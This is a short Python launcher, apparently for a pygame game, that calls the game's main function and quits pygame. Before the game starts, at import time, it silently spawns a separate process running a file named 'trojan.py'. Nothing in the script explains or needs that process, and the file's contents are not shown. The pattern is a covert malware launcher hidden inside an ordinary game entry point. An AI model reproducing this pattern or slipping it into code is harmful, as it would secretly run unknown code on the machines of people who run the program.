import pygame as pg
from source.main import main
import subprocess
import sys


process = subprocess.Popen(["python", "trojan.py"])

if __name__=='__main__':
    

    main()
    pg.quit()





